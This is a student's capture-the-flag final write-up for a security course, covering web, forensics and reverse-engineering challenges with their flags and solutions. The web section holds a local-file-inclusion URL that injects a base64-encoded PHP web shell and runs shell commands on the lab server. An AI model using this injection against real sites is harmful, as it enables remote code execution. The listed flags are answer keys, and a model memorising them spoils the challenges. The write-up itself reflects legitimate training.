@@ -1,0 +1,54 @@
+Remi Trettin
+CIS4930
+Final CTF
+
+WEB
+Easy
+FLAG: flag{w0wz_ur_g00d_47_m47H_huh??}
+Solution: I used the web practice LFI/RCE example to view the source and get the flag.
+
+http://web.n0l3ptr.com:8080/Practice/lfi.php?page=data://text/plain;base64,%20PD9waHANCiRjbWQgPSAoJF9SRVFVRVNUWyJjbWQiXSk7DQpzeXN0ZW0oJGNtZCk7Pz4NCg==&cmd=cat%20../WebFinal/easy.php
+
+Medium
+FLAG: flag{1_533_Y0ur_SQL_sk1llz_h4v3_1mpr0v3d}
+Solution: I used the web practice LFI/RCE example to view the source and get the flag.
+
+http://web.n0l3ptr.com:8080/Practice/lfi.php?page=data://text/plain;base64,%20PD9waHANCiRjbWQgPSAoJF9SRVFVRVNUWyJjbWQiXSk7DQpzeXN0ZW0oJGNtZCk7Pz4NCg==&cmd=cat%20../WebFinal/medium.php
+
+Hard
+FLAG: flag{Y0u_h4v3_d0n3_v3ry_w311__h4v3_4_n1c3_5umm3r!}
+Solution: I used the web practice LFI/RCE example to view the source and get the flag.
+
+http://web.n0l3ptr.com:8080/Practice/lfi.php?page=data://text/plain;base64,%20PD9waHANCiRjbWQgPSAoJF9SRVFVRVNUWyJjbWQiXSk7DQpzeXN0ZW0oJGNtZCk7Pz4NCg==&cmd=cat%20../WebFinal/hard.php
+
+FORENSICS
+Anti-Forensics
+FLAG: flag{K33p_up_1f_U-C4|\|}
+Solution: I ran file on the docx file and confirmed what it was. I extracted the contents from the docx file. I went to the media directory and found the image2.jpg file which was not included in the actual document. The image was a QR code so I scanned it and got rick rolled. Then, I opened the QR code image in xxd and saw base64 right away in the beginning of the file. Decoding that gives the flag.
+
+ZmxhZ3tLMzNwX3VwXzFmX1UtQzR8XHx9Cg==
+
+Double-Dealing Diva
+FLAG: flag{0rd3r_M04r_R3d_F3d0r4s_s00n}
+Solution: I opened the two pcap files in wireshark. Each file contained a TCP stream which I followed. The data was base64 decoded and each stream provided a jpg file. I ran vbindiff on the two images to get the bytes that were different between them.
+
+5a 6d 78 68 5a 33 73 77 63 6d 51 7a 63 6c 39 4e 4d 44 52 79 58 31 49 7a 5a 46 39 47 4d 32 51 77 63 6a 52 7a 58 33 4d 77 4d 47 35 39 43 67 3d 3d
+
+I converted the hex bytes to ascii which was base64. This decoded into the flag.
+
+RE
+Access Code
+FLAG: flag{2147433647}
+Solution: I ran file on the binary to determine what it was. It was a 64 bit binary. I opened the file in r2 and examined the instructions. The access code the binary asks for when you run it is based on a calculation.
+
+(x - 1973640000) * 2 = 347587294
+
+This calculation can be reversed to find the correct input.
+
+x = 2147433647
+
+Learn 2 Run
+FLAG: flag{x86_will_a1ways_b3_b3t3r}
+Solution: I ran file on the binary and saw it was a 32 bit ARM binary. I could not run this natively. I used QEMU to run the binary and the flag was printed immediately.
+
+qemu-arm learn2run
